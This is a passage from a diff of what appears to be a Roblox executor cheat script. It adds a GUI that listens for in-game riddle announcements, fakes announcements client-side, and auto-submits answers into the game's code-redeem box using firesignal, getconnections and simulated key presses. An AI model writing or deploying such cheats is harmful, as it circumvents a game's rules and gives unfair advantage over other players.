+local SolveLbl = label("0 solved", 10, C.txt, FB, Enum.TextXAlignment.Center, SolvePill)
+SolveLbl.Size = UDim2.fromScale(1,1); SolveLbl.Position = UDim2.fromScale(0,0)
+SolveLbl.ZIndex = 5
+
+local ClearLogBtn = ghostBtn("CLEAR", FeedHeader)
+ClearLogBtn.Size = UDim2.fromOffset(56, 24); ClearLogBtn.Position = UDim2.new(1, -64, 0.5, -12)
+
+local LogBtn = ghostBtn("LOG", FeedHeader)
+LogBtn.Size = UDim2.fromOffset(44, 24); LogBtn.Position = UDim2.new(1, -114, 0.5, -12)
+
+local FeedBox = new("Frame", {
+    Size = UDim2.new(1, -20, 1, -76),
+    Position = UDim2.fromOffset(10, 46),
+    BackgroundColor3 = C.bgDeep, BorderSizePixel = 0,
+    ClipsDescendants = true,
+    ZIndex = 4,
+}, FeedPage)
+corner(FeedBox, 8); stroke(FeedBox, C.lineSoft, 1, 0.4)
+
+local FeedScroll = new("ScrollingFrame", {
+    Size = UDim2.new(1, -12, 1, -12),
+    Position = UDim2.fromOffset(6, 6),
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    CanvasSize = UDim2.new(0,0,0,0),
+    AutomaticCanvasSize = Enum.AutomaticSize.Y,
+    ScrollBarThickness = 3,
+    ScrollBarImageColor3 = C.acc,
+    ScrollBarImageTransparency = 0.35,
+    ScrollingDirection = Enum.ScrollingDirection.Y,
+    ZIndex = 5,
+}, FeedBox)
+
+local FeedOutput = new("TextLabel", {
+    Size = UDim2.new(1, -6, 0, 0),
+    AutomaticSize = Enum.AutomaticSize.Y,
+    BackgroundTransparency = 1,
+    RichText = true,
+    Text = '<font color="' .. RICH.Dim .. '">waiting for riddles…</font>',
+    TextSize = 12,
+    Font = Enum.Font.Code,
+    TextColor3 = C.txt,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    TextYAlignment = Enum.TextYAlignment.Top,
+    TextWrapped = true,
+    ZIndex = 6,
+}, FeedScroll)
+
+local feedLines = {}
+local solvedCount = 0
+
+local function feedScrollBottom()
+    task.defer(function()
+        task.wait()
+        local bottom = math.max(0, FeedScroll.AbsoluteCanvasSize.Y - FeedScroll.AbsoluteWindowSize.Y)
+        FeedScroll.CanvasPosition = Vector2.new(0, bottom)
+    end)
+end
+local function feedAppend(line)
+    feedLines[#feedLines+1] = line
+    if #feedLines > 250 then table.remove(feedLines, 1) end
+    FeedOutput.Text = table.concat(feedLines, "\n")
+    feedScrollBottom()
+end
+local function feedReplaceLast(line)
+    if #feedLines == 0 then return feedAppend(line) end
+    feedLines[#feedLines] = line
+    FeedOutput.Text = table.concat(feedLines, "\n")
+    feedScrollBottom()
+end
+local function feedClear()
+    feedLines = {}
+    solvedCount = 0
+    SolveLbl.Text = "0 solved"
+    FeedOutput.Text = '<font color="' .. RICH.Dim .. '">waiting for riddles…</font>'
+    FeedScroll.CanvasPosition = Vector2.new(0,0)
+end
+ClearLogBtn.MouseButton1Click:Connect(feedClear)
+
+-- ============================================================
+-- SETTINGS PAGE (draggable small popup, floating)
+-- ============================================================
+local SettingsFloat
+local function buildSettingsFloat()
+    if SG:FindFirstChild("SettingsFloat") then SG.SettingsFloat:Destroy() end
+    local W, H = 260, 240
+    local P = new("Frame", {
+        Name = "SettingsFloat",
+        Size = UDim2.fromOffset(W, H),
+        Position = UDim2.new(0.5, -W/2, 0.5, -H/2),
+        BackgroundColor3 = C.bg,
+        BorderSizePixel = 0,
+        Active = true,
+        ClipsDescendants = true,
+        ZIndex = 15,
+    }, SG)
+    corner(P, 12); stroke(P, C.line, 1, 0.3)
+    gradient(P, C.header, C.bg, 90)
+
+    local PH = new("Frame", {
+        Size = UDim2.new(1, 0, 0, 34),
+        BackgroundColor3 = C.header,
+        BorderSizePixel = 0, ZIndex = 16, Active = true,
+    }, P)
+    corner(PH, 12)
+    new("Frame", { Size = UDim2.new(1,0,0,12), Position = UDim2.new(0,0,1,-12), BackgroundColor3 = C.header, BorderSizePixel = 0, ZIndex = 16 }, PH)
+
+    local logo = new("Frame", {
+        Size = UDim2.fromOffset(18, 18), Position = UDim2.fromOffset(10, 8),
+        BackgroundColor3 = C.acc, BorderSizePixel = 0, ZIndex = 17,
+    }, PH)
+    corner(logo, 9); gradient(logo, C.acc2, C.accHi, 45)
+
+    local t = label("SETTINGS", 12, C.txt, FBK, Enum.TextXAlignment.Left, PH)
+    t.Size = UDim2.new(0, 120, 1, 0); t.Position = UDim2.fromOffset(34, 0); t.ZIndex = 17
+
+    local X = new("TextButton", {
+        Size = UDim2.fromOffset(22, 22), Position = UDim2.new(1, -28, 0.5, -11),
+        BackgroundColor3 = C.panel2, Text = "X", TextColor3 = C.txt, Font = FBK, TextSize = 11,
+        AutoButtonColor = false, BorderSizePixel = 0, ZIndex = 17,
+    }, PH)
+    corner(X, 6)
+    X.MouseButton1Click:Connect(function() P:Destroy() end)
+
+    local function toggleRow(y, labelText, init, onChange)
+        local row = new("Frame", {
+            Size = UDim2.new(1, -20, 0, 42),
+            Position = UDim2.fromOffset(10, y),
+            BackgroundColor3 = C.panel, BorderSizePixel = 0,
+            ZIndex = 16,
+        }, P)
+        corner(row, 8); stroke(row, C.lineSoft, 1, 0.55)
+        local lbl = label(labelText, 11, C.txt, FBK, Enum.TextXAlignment.Left, row)
+        lbl.Size = UDim2.new(1, -70, 1, 0)
+        lbl.Position = UDim2.fromOffset(14, 0)
+        lbl.ZIndex = 17
+
+        local track = new("Frame", {
+            Size = UDim2.fromOffset(46, 22),
+            Position = UDim2.new(1, -58, 0.5, -11),
+            BackgroundColor3 = init and C.acc or C.toggleOff,
+            BorderSizePixel = 0,
+            ZIndex = 17,
+        }, row)
+        corner(track, 11)
+        if init then gradient(track, C.acc2, C.acc, 90) end
+        local knob = new("Frame", {
+            Size = UDim2.fromOffset(18, 18),
+            Position = init and UDim2.new(1, -20, 0.5, -9) or UDim2.fromOffset(2, 2),
+            BackgroundColor3 = Color3.fromRGB(255,255,255),
+            BorderSizePixel = 0,
+            ZIndex = 18,
+        }, track)
+        corner(knob, 9)
+        local btn = new("TextButton", { Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, Text = "", ZIndex = 19 }, track)
+        local s = init
+        local function set(v)
+            s = v
+            track.BackgroundColor3 = s and C.acc or C.toggleOff
+            knob.Position = s and UDim2.new(1, -20, 0.5, -9) or UDim2.fromOffset(2, 2)
+            if s then
+                if not track:FindFirstChildOfClass("UIGradient") then gradient(track, C.acc2, C.acc, 90) end
+            else
+                local g = track:FindFirstChildOfClass("UIGradient"); if g then g:Destroy() end
+            end
+            if onChange then onChange(s) end
+        end
+        btn.MouseButton1Click:Connect(function() set(not s) end)
+        return row
+    end
+
+    toggleRow(44,  "AUTO LISTEN",           state.autoListen,      function(v) state.autoListen = v end)
+    toggleRow(92,  "IGNORE SYSTEM PHRASES", state.ignoreSystem,    function(v) state.ignoreSystem = v end)
+
+    local duoRow = new("Frame", {
+        Size = UDim2.new(1, -20, 0, 42),
+        Position = UDim2.fromOffset(10, 140),
+        BackgroundColor3 = C.panel, BorderSizePixel = 0,
+        ZIndex = 16,
+    }, P)
+    corner(duoRow, 8); stroke(duoRow, C.lineSoft, 1, 0.55)
+    local duoLbl = label("DUO MODE (WITH REDEEMER)", 11, C.txt, FBK, Enum.TextXAlignment.Left, duoRow)
+    duoLbl.Size = UDim2.new(1, -110, 1, 0); duoLbl.Position = UDim2.fromOffset(14, 0); duoLbl.ZIndex = 17
+
+    local duoPill = new("Frame", {
+        Size = UDim2.fromOffset(46, 22),
+        Position = UDim2.new(1, -106, 0.5, -11),
+        BackgroundColor3 = C.panel2, BorderSizePixel = 0,
+        ZIndex = 17,
+    }, duoRow)
+    corner(duoPill, 11); stroke(duoPill, C.lineSoft, 1, 0.5)
+    local duoPl = label("0/2", 10, C.sub, FB, Enum.TextXAlignment.Center, duoPill)
+    duoPl.Size = UDim2.fromScale(1,1); duoPl.Position = UDim2.fromScale(0,0); duoPl.ZIndex = 18
+
+    local duoTrack = new("Frame", {
+        Size = UDim2.fromOffset(46, 22),
+        Position = UDim2.new(1, -58, 0.5, -11),
+        BackgroundColor3 = C.toggleOff, BorderSizePixel = 0,
+        ZIndex = 17,
+    }, duoRow)
+    corner(duoTrack, 11)
+    local duoKnob = new("Frame", {
+        Size = UDim2.fromOffset(18, 18),
+        Position = UDim2.fromOffset(2, 2),
+        BackgroundColor3 = Color3.fromRGB(255,255,255), BorderSizePixel = 0,
+        ZIndex = 18,
+    }, duoTrack)
+    corner(duoKnob, 9)
+
+    local duoClick = new("TextButton", {
+        Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, Text = "", ZIndex = 19,
+    }, duoRow)
+    local function applyDuoVisual()
+        local n = state.duoCount
+        duoPl.Text = n .. "/2"
+        if n > 0 then
+            duoPl.TextColor3 = C.txt
+            duoTrack.BackgroundColor3 = C.acc
+            if not duoTrack:FindFirstChildOfClass("UIGradient") then gradient(duoTrack, C.acc2, C.acc, 90) end
+            duoKnob.Position = UDim2.new(1, -20, 0.5, -9)
+        else
+            duoPl.TextColor3 = C.sub
+            duoTrack.BackgroundColor3 = C.toggleOff
+            local g = duoTrack:FindFirstChildOfClass("UIGradient"); if g then g:Destroy() end
+            duoKnob.Position = UDim2.fromOffset(2, 2)
+        end
+    end
+    applyDuoVisual()
+    duoClick.MouseButton1Click:Connect(function()
+        state.duoCount = (state.duoCount + 1) % 3
+        applyDuoVisual()
+    end)
+
+    drag(PH, P)
+    SettingsFloat = P
+end
+
+-- ============================================================
+-- COLORS BUTTON (Test page footer, same row as SENDER)
+-- ============================================================
+local ColorRow = new("Frame", {
+    Size = UDim2.new(1, -20, 0, 42),
+    Position = UDim2.fromOffset(10, yBase + 4*gap + 94),
+    BackgroundColor3 = C.panel, BorderSizePixel = 0,
+    ZIndex = 4,
+}, TestScroll)
+corner(ColorRow, 8); stroke(ColorRow, C.lineSoft, 1, 0.55)
+
+local ColorLbl = label("COLORS", 11, C.txt, FBK, Enum.TextXAlignment.Left, ColorRow)
+ColorLbl.Size = UDim2.new(0, 70, 1, 0); ColorLbl.Position = UDim2.fromOffset(14, 0)
+ColorLbl.ZIndex = 5
+
+local ColorSwatch = new("Frame", {
+    Size = UDim2.fromOffset(46, 22),
+    Position = UDim2.new(1, -58, 0.5, -11),
+    BackgroundColor3 = C.acc,
+    BorderSizePixel = 0,
+    ZIndex = 5,
+}, ColorRow)
+corner(ColorSwatch, 11)
+gradient(ColorSwatch, C.acc2, C.accHi, 90)
+stroke(ColorSwatch, C.accHi, 1, 0.4)
+local SwatchLbl = label("BLUE", 9, Color3.fromRGB(255,255,255), FBK, Enum.TextXAlignment.Center, ColorSwatch)
+SwatchLbl.Size = UDim2.fromScale(1,1); SwatchLbl.Position = UDim2.fromScale(0,0)
+SwatchLbl.ZIndex = 6
+
+local ColorBtn = new("TextButton", {
+    Size = UDim2.fromScale(1,1),
+    BackgroundTransparency = 1,
+    Text = "",
+    ZIndex = 7,
+}, ColorRow)
+
+local function buildColorPicker()
+    if SG:FindFirstChild("ColorPicker") then SG.ColorPicker:Destroy() end
+    local W, H = 220, 190
+    local P = new("Frame", {
+        Name = "ColorPicker",
+        Size = UDim2.fromOffset(W, H),
+        Position = UDim2.new(0.5, -W/2, 0.5, -H/2),
+        BackgroundColor3 = C.bg,
+        BorderSizePixel = 0,
+        Active = true,
+        ZIndex = 20,
+    }, SG)
+    corner(P, 12); stroke(P, C.line, 1, 0.3)
+    gradient(P, C.header, C.bg, 90)
+
+    local PH = new("Frame", {
+        Size = UDim2.new(1, 0, 0, 34),
+        BackgroundColor3 = C.header, BorderSizePixel = 0, ZIndex = 21,
+    }, P)
+    corner(PH, 12)
+    new("Frame", { Size = UDim2.new(1,0,0,12), Position = UDim2.new(0,0,1,-12), BackgroundColor3 = C.header, BorderSizePixel = 0, ZIndex = 21 }, PH)
+
+    local t = label("CHOOSE COLOR", 12, C.txt, FBK, Enum.TextXAlignment.Left, PH)
+    t.Size = UDim2.new(1, -70, 1, 0); t.Position = UDim2.fromOffset(12, 0); t.ZIndex = 22
+
+    local X = new("TextButton", {
+        Size = UDim2.fromOffset(22, 22), Position = UDim2.new(1, -28, 0.5, -11),
+        BackgroundColor3 = C.panel2, Text = "X", TextColor3 = C.txt, Font = FBK, TextSize = 10,
+        AutoButtonColor = false, BorderSizePixel = 0, ZIndex = 22,
+    }, PH)
+    corner(X, 6)
+    X.MouseButton1Click:Connect(function() P:Destroy() end)
+
+    local options = {
+        { name = "BLUE",    col = Color3.fromRGB(40, 110, 220) },
+        { name = "RED",     col = Color3.fromRGB(220, 40, 60) },
+        { name = "GREEN",   col = Color3.fromRGB(40, 200, 100) },
+        { name = "RAINBOW", col = Color3.fromRGB(220, 60, 200) },
+    }
+
+    for i, opt in ipairs(options) do
+        local row = new("Frame", {
+            Size = UDim2.new(1, -20, 0, 30),
+            Position = UDim2.fromOffset(10, 42 + (i-1) * 34),
+            BackgroundColor3 = C.panel2,
+            BorderSizePixel = 0,
+            ZIndex = 22,
+        }, P)
+        corner(row, 6); stroke(row, C.lineSoft, 1, 0.4)
+
+        local sw = new("Frame", {
+            Size = UDim2.fromOffset(20, 20),
+            Position = UDim2.fromOffset(6, 5),
+            BackgroundColor3 = opt.col,
+            BorderSizePixel = 0,
+            ZIndex = 23,
+        }, row)
+        corner(sw, 10)
+        if opt.name == "RAINBOW" then
+            new("UIGradient", {
+                Color = ColorSequence.new({
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+                    ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)),
+                    ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
+                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
+                    ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 0, 255)),
+                    ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
+                }),
+                Rotation = 45,
+            }, sw)
+        end
+
+        local rl = label(opt.name, 11, C.txt, FBK, Enum.TextXAlignment.Left, row)
+        rl.Size = UDim2.new(1, -40, 1, 0); rl.Position = UDim2.fromOffset(34, 0); rl.ZIndex = 23
+
+        local btn = new("TextButton", {
+            Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, Text = "", ZIndex = 24,
+        }, row)
+        btn.MouseButton1Click:Connect(function()
+            state.palette = opt.name
+            applyPalette(opt.name)
+            SwatchLbl.Text = opt.name
+            ColorSwatch.BackgroundColor3 = C.acc
+            local g = ColorSwatch:FindFirstChildOfClass("UIGradient"); if g then g:Destroy() end
+            gradient(ColorSwatch, C.acc2, C.accHi, 90)
+            local s = ColorSwatch:FindFirstChildOfClass("UIStroke"); if s then s.Color = C.accHi end
+            for _, d in ipairs(drops) do
+                if d.frame then d.frame.BackgroundColor3 = C.rain end
+            end
+            updateHeadTagColors()
+            feedAppend('<font color="' .. RICH.Green .. '">[theme] switched to ' .. opt.name .. '</font>')
+            P:Destroy()
+        end)
+    end
+
+    drag(PH, P)
+end
+
+ColorBtn.MouseButton1Click:Connect(buildColorPicker)
+
+TabButtons["Settings"].MouseButton1Click:Connect(function()
+    buildSettingsFloat()
+end)
+
+-- ============================================================
+-- SEND-ANNOUNCEMENT DISPATCH
+-- ============================================================
+local notifyRemoteRef = nil
+local onAnnouncementRef = nil
+
+local function tryResolve()
+    if notifyRemoteRef and notifyRemoteRef.Parent then return notifyRemoteRef end
+    local r = resolveNotifyRemote()
+    if r then
+        notifyRemoteRef = r
+        env.RiddlerNotifyRemote = r
+    end
+    return notifyRemoteRef
+end
+
+local function fireAnnouncement(txt)
+    txt = trim(txt or "")
+    if txt == "" then return false, "empty" end
+
+    local remote = tryResolve()
+    local method = nil
+
+    if remote and typeof(firesignal) == "function" then
+        local ok = pcall(function()
+            firesignal(remote.OnClientEvent, txt, 5.5, "Sounds.Sfx.Blop", "Top", 2678001507)
+        end)
+        if ok then method = "firesignal" end
+    end
+
+    if not method and remote and typeof(getconns) == "function" then
+        local ok = pcall(function()
+            local conns = getconns(remote.OnClientEvent)
+            if type(conns) == "table" then
+                for _, c in ipairs(conns) do
+                    pcall(function()
+                        if c.Enabled ~= false then
+                            c:Fire(txt, 5.5, "Sounds.Sfx.Blop", "Top", 2678001507)
+                        end
+                    end)
+                end
+            end
+        end)
+        if ok then method = "getconnections" end
+    end
+
+    if not method and onAnnouncementRef then
+        pcall(onAnnouncementRef, txt, 5.5, "Sounds.Sfx.Blop", "Top", 2678001507)
+        method = "local"
+    end
+
+    return method ~= nil, method or "unresolved"
+end
+
+-- ============================================================
+-- TEST SENDER POPUP
+-- ============================================================
+local function buildTestSender()
+    if SG:FindFirstChild("TestSender") then SG.TestSender:Destroy() end
+    local W, H = 300, 178
+    local P = new("Frame", {
+        Name = "TestSender",
+        Size = UDim2.fromOffset(W, H),
+        Position = UDim2.new(0.5, -W/2, 0.5, -H/2),
+        BackgroundColor3 = C.bg,
+        BorderSizePixel = 0,
+        Active = true,
+        ZIndex = 10,
+    }, SG)
+    corner(P, 12); stroke(P, C.line, 1, 0.3)
+    gradient(P, C.header, C.bg, 90)
+
+    local PH = new("Frame", {
+        Size = UDim2.new(1, 0, 0, 34),
+        BackgroundColor3 = C.header, BorderSizePixel = 0, ZIndex = 11,
+    }, P)
+    corner(PH, 12)
+    new("Frame", { Size = UDim2.new(1,0,0,12), Position = UDim2.new(0,0,1,-12), BackgroundColor3 = C.header, BorderSizePixel = 0, ZIndex = 11 }, PH)
+
+    local logo = new("Frame", {
+        Size = UDim2.fromOffset(18, 18), Position = UDim2.fromOffset(10, 8),
+        BackgroundColor3 = C.acc, BorderSizePixel = 0, ZIndex = 12,
+    }, PH)
+    corner(logo, 9); gradient(logo, C.acc2, C.accHi, 45)
+
+    local t = label("TEST SENDER", 12, C.txt, FBK, Enum.TextXAlignment.Left, PH)
+    t.Size = UDim2.new(1, -70, 1, 0); t.Position = UDim2.fromOffset(34, 0); t.ZIndex = 12
+
+    local X = new("TextButton", {
+        Size = UDim2.fromOffset(22, 22), Position = UDim2.new(1, -28, 0.5, -11),
+        BackgroundColor3 = C.panel2, Text = "X", TextColor3 = C.txt, Font = FBK, TextSize = 10,
+        AutoButtonColor = false, BorderSizePixel = 0, ZIndex = 12,
+    }, PH)
+    corner(X, 6)
+    X.MouseButton1Click:Connect(function() P:Destroy() end)
+
+    local sub = label("FAKE RIDDLE  ·  as SpyderSammy", 10, C.sub, FBK, Enum.TextXAlignment.Left, P)
+    sub.Size = UDim2.new(1, -24, 0, 12); sub.Position = UDim2.fromOffset(12, 42); sub.ZIndex = 12
+
+    local Box = new("TextBox", {
+        Size = UDim2.new(1, -24, 0, 40),
+        Position = UDim2.fromOffset(12, 58),
+        BackgroundColor3 = C.input, BorderSizePixel = 0,
+        PlaceholderText = "type the announcement to fire...",
+        PlaceholderColor3 = C.dim,
+        Text = "", TextColor3 = C.txt, ClearTextOnFocus = false,
+        Font = FM, TextSize = 12,
+        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
+        TextWrapped = true, MultiLine = true, ZIndex = 12,
+    }, P)
+    corner(Box, 6); stroke(Box, C.lineSoft, 1, 0.4)
+    new("UIPadding", { PaddingLeft = UDim.new(0, 8), PaddingTop = UDim.new(0, 6), PaddingRight = UDim.new(0, 8) }, Box)
+
+    local SampleBtn = ghostBtn("SAMPLE", P)
+    SampleBtn.Size = UDim2.fromOffset(120, 30); SampleBtn.Position = UDim2.fromOffset(12, 106); SampleBtn.ZIndex = 12
+
+    local SendBtn = accentBtn("SEND", P)
+    SendBtn.Size = UDim2.fromOffset(132, 30); SendBtn.Position = UDim2.new(1, -144, 0, 106); SendBtn.ZIndex = 12
+
+    local note = label("posts as SpyderSammy through the same top-notification handler - client side only", 9, C.dim, FM, Enum.TextXAlignment.Left, P)
+    note.Size = UDim2.new(1, -24, 0, 24)
+    note.Position = UDim2.fromOffset(12, 142)
+    note.TextWrapped = true
+    note.ZIndex = 12
+
+    local samples = {
+        "what is my real name",
+        "how old am i",
+        "what is my favorite color",
+        "what is my favorite food",
+        "what is my cats name",
+        "what is the name of the game",
+        "who made steal a brainrot",
+        "what is my favorite number",
+        "what is my name twice",
+        "where do i live",
+        "what event did pot pumpkin come out in",
+        "what craft did the la supreme come from",
+    }
+    SampleBtn.MouseButton1Click:Connect(function()
+        Box.Text = samples[math.random(1, #samples)]
+    end)
+
+    local function doSend()
+        local txt = trim(Box.Text)
+        if txt == "" then return end
+        local ok, method = fireAnnouncement(txt)
+        local tag = ok and ('<font color="' .. RICH.Green .. '">') or ('<font color="' .. RICH.Red .. '">')
+        feedAppend(tag .. '[sender] ' .. tostring(method) .. '</font>')
+        Box.Text = ""
+    end
+
+    SendBtn.MouseButton1Click:Connect(doSend)
+    Box.FocusLost:Connect(function(enter)
+        if enter then doSend() end
+    end)
+
+    drag(PH, P)
+end
+
+SenderBtn.MouseButton1Click:Connect(buildTestSender)
+
+-- ============================================================
+-- SOLVE LOG POPUP
+-- ============================================================
+local function buildSolveLog()
+    if SG:FindFirstChild("SolveLog") then SG.SolveLog:Destroy() end
+    local W, H = 320, 320
+    local P = new("Frame", {
+        Name = "SolveLog",
+        Size = UDim2.fromOffset(W, H),
+        Position = UDim2.new(0.5, -W/2 - 20, 0.5, -H/2 + 40),
+        BackgroundColor3 = C.bgDeep,
+        BorderSizePixel = 0,
+        Active = true,
+        ZIndex = 10,
+    }, SG)
+    corner(P, 12); stroke(P, C.line, 1, 0.3)
+
+    local PH = new("Frame", {
+        Size = UDim2.new(1, 0, 0, 34),
+        BackgroundColor3 = C.header,
+        BorderSizePixel = 0, ZIndex = 11, Active = true,
+    }, P)
+    corner(PH, 12)
+    new("Frame", { Size = UDim2.new(1,0,0,12), Position = UDim2.new(0,0,1,-12), BackgroundColor3 = C.header, BorderSizePixel = 0, ZIndex = 11 }, PH)
+
+    local logo = new("Frame", {
+        Size = UDim2.fromOffset(18, 18), Position = UDim2.fromOffset(10, 8),
+        BackgroundColor3 = C.acc, BorderSizePixel = 0, ZIndex = 12,
+    }, PH)
+    corner(logo, 9); gradient(logo, C.acc2, C.accHi, 45)
+
+    local t = label("SOLVE LOG", 12, C.txt, FBK, Enum.TextXAlignment.Left, PH)
+    t.Size = UDim2.new(0, 120, 1, 0); t.Position = UDim2.fromOffset(34, 0); t.ZIndex = 12
+
+    local countLbl = label("0 solved", 10, C.sub, FM, Enum.TextXAlignment.Left, PH)
+    countLbl.Size = UDim2.new(0, 80, 1, 0); countLbl.Position = UDim2.fromOffset(140, 0); countLbl.ZIndex = 12
+
+    local Clear = new("TextButton", {
+        Size = UDim2.fromOffset(56, 22), Position = UDim2.new(1, -84, 0.5, -11),
+        BackgroundColor3 = C.accHi,
+        Text = "Clear", TextColor3 = C.bgDeep, Font = FBK, TextSize = 10,
+        AutoButtonColor = false, BorderSizePixel = 0, ZIndex = 12,
+    }, PH)
+    corner(Clear, 6)
+
+    local X = new("TextButton", {
+        Size = UDim2.fromOffset(22, 22), Position = UDim2.new(1, -28, 0.5, -11),
+        BackgroundColor3 = C.panel2, Text = "X", TextColor3 = C.txt, Font = FBK, TextSize = 11,
+        AutoButtonColor = false, BorderSizePixel = 0, ZIndex = 12,
+    }, PH)
+    corner(X, 6)
+    X.MouseButton1Click:Connect(function() P:Destroy() end)
+
+    local Body = new("ScrollingFrame", {
+        Size = UDim2.new(1, -20, 1, -46),
+        Position = UDim2.fromOffset(10, 40),
+        BackgroundColor3 = C.bgDeep, BorderSizePixel = 0,
+        CanvasSize = UDim2.new(0,0,0,0),
+        AutomaticCanvasSize = Enum.AutomaticSize.Y,
+        ScrollBarThickness = 3,
+        ScrollBarImageColor3 = C.acc,
+        ScrollBarImageTransparency = 0.35,
+        ZIndex = 12,
+    }, P)
+    corner(Body, 8)
+
+    local bodyLbl = new("TextLabel", {
+        Size = UDim2.new(1, -12, 0, 0),
+        AutomaticSize = Enum.AutomaticSize.Y,
+        BackgroundTransparency = 1,
+        RichText = true, Text = "", TextSize = 12, Font = Enum.Font.Code,
+        TextColor3 = C.txt,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        TextYAlignment = Enum.TextYAlignment.Top,
+        TextWrapped = true,
+        Position = UDim2.fromOffset(6, 6), ZIndex = 13,
+    }, Body)
+
+    local lines = {}
+    local count = 0
+
+    local function refresh()
+        bodyLbl.Text = table.concat(lines, "\n")
+        countLbl.Text = count .. " solved"
+        task.defer(function()
+            task.wait()
+            Body.CanvasPosition = Vector2.new(0, math.max(0, Body.AbsoluteCanvasSize.Y - Body.AbsoluteWindowSize.Y))
+        end)
+    end
+
+    Clear.MouseButton1Click:Connect(function()
+        lines = {}; count = 0; refresh()
+    end)
+
+    drag(PH, P)
+
+    local api = {}
+    api.add = function(question, answer)
+        count = count + 1
+        local ts = os.date("%H:%M:%S")
+        lines[#lines+1] = '<font color="' .. RICH.Dim .. '">[' .. ts .. ']</font> '
+            .. '<font color="' .. RICH.Amber .. '">Q:</font> '
+            .. '<font color="' .. RICH.White .. '">' .. stripRich(question):sub(1, 70) .. '</font>'
+        lines[#lines+1] = '<font color="' .. RICH.Purp .. '">   → </font>'
+            .. '<font color="' .. RICH.Green .. '">' .. tostring(answer or "?") .. '</font>'
+        lines[#lines+1] = ""
+        refresh()
+    end
+    return api
+end
+
+local activeSolveLog = nil
+LogBtn.MouseButton1Click:Connect(function()
+    activeSolveLog = buildSolveLog()
+end)
+
+-- ============================================================
+-- REDEEM + SUBMIT ANSWER
+-- ============================================================
+local function getGameCodeBox()
+    local pg = LP:FindFirstChildOfClass("PlayerGui")
+    if not pg then return nil end
+    local gui = pg:FindFirstChild("Codes")
+    if not gui then return nil end
+    local root = gui:FindFirstChild("Codes") or gui
+    local redeem = root:FindFirstChild("CodeRedeem")
+    local box = redeem and redeem:FindFirstChild("TextBox")
+    if box and box:IsA("TextBox") then return box end
+    for _, item in ipairs(gui:GetDescendants()) do
+        if item:IsA("TextBox") then return item end
+    end
+end
+
+local function fireConns(signal, ...)
+    if typeof(getconns) ~= "function" then return false end
+    local ok, cs = pcall(getconns, signal)
+    if not ok or type(cs) ~= "table" then return false end
+    local args = table.pack(...)
+    local fired = false
+    for _, c in ipairs(cs) do
+        local ok2 = pcall(function()
+            if c.Enabled ~= false then
+                if args.n > 0 then c:Fire(table.unpack(args, 1, args.n))
+                else c:Fire(true) end
+            end
+        end)
+        fired = fired or ok2
+    end
+    return fired
+end
+
+local function submitAnswer(answer)
+    local box = getGameCodeBox()
+    if not box then return false, "code box not found" end
+    answer = tostring(answer or ""):upper():gsub("%s+", "")
+    if answer == "" then return false, "empty" end
+
+    pcall(function() box.Text = "" end)
+    task.wait(0.04)
+    pcall(function() box.Text = answer end)
+    for _ = 1, 8 do
+        task.wait(0.04)
+        if box.Text == answer then break end
+        pcall(function() box.Text = answer end)
+    end
+    task.wait(0.08)
+
+    local submitted = false
+
+    if fireConns(box.FocusLost, true) then submitted = true end
+    task.wait(0.05)
+
+    pcall(function()
+        local parent = box.Parent
+        if not parent then return end
+        for _, child in ipairs(parent:GetDescendants()) do
+            if child:IsA("TextButton") or child:IsA("ImageButton") then
+                local t = ((child.Text or "") .. (child.Name or "")):lower()
+                if t:find("redeem") or t:find("submit") or t:find("enter") or t:find("claim") then
+                    fireConns(child.MouseButton1Click)
+                    pcall(function() child:Activate() end)
+                    submitted = true
+                    return
+                end
+            end
+        end
+    end)
+    task.wait(0.05)
+
+    if not submitted then
+        pcall(function()
+            if typeof(keypress) == "function" then
+                keypress(0x0D); task.wait(0.04)
+                if typeof(keyrelease) == "function" then keyrelease(0x0D) end
+                submitted = true
+            end
+        end)
+        if not submitted then
+            pcall(function()
+                local vim = game:GetService("VirtualInputManager")
+                if vim then
+                    vim:SendKeyEvent(true, Enum.KeyCode.Return, false, game); task.wait(0.04)
+                    vim:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+                    submitted = true
+                end
+            end)
+        end
+    end
+
+    pcall(function() box:ReleaseFocus(false) end)
+
+    return true, submitted and "answer submitted" or "answer typed"
+end
+
+local function setClipboardSafe(text)
+    if not text or text == "" then return end
+    if setclipboard then pcall(setclipboard, text)
+    elseif toclipboard then pcall(toclipboard, text) end
+end
+CopyBtn.MouseButton1Click:Connect(function()
+    if AnswerInput.Text ~= "" then
+        setClipboardSafe(AnswerInput.Text)
+        AnswerInput.TextColor3 = C.ok
+        task.delay(0.35, function() AnswerInput.TextColor3 = C.txt end)
+    end
+end)
+ClearBtn.MouseButton1Click:Connect(function()
+    AnswerInput.Text = ""
+    QText.Text = "waiting for announcement..."
+    QText.TextColor3 = C.dim
+end)
+RedeemBtn.MouseButton1Click:Connect(function()
+    local a = AnswerInput.Text
+    if a ~= "" then
+        local ok, msg = submitAnswer(a)
+        local tag = ok and '<font color="' .. RICH.Green .. '">' or ('<font color="' .. RICH.Red .. '">')
+        feedAppend(tag .. '[redeem] ' .. tostring(msg or "sent") .. '</font>')
+    end
+end)
+
+-- ============================================================
+-- NOTIFY LISTENER + SOLVER PIPELINE
+-- ============================================================
+local listenConn = nil
+
+local POSITIONS = {
+    Top=true, Bottom=true, Center=true, Middle=true, Left=true, Right=true,
+    TopRight=true, TopLeft=true, BottomRight=true, BottomLeft=true,
+}
+local function looksLikeAnnouncement(...)
+    local args = table.pack(...)
+    if args.n == 0 or typeof(args[1]) ~= "string" then return false end
+    for i = 2, args.n do
+        local v = args[i]
+        if typeof(v) == "string"
+            and (v:find("Sounds%.") or v:find("rbxassetid") or POSITIONS[v])
+        then return true end
+    end
+    return false
+end
+
+local solving = false
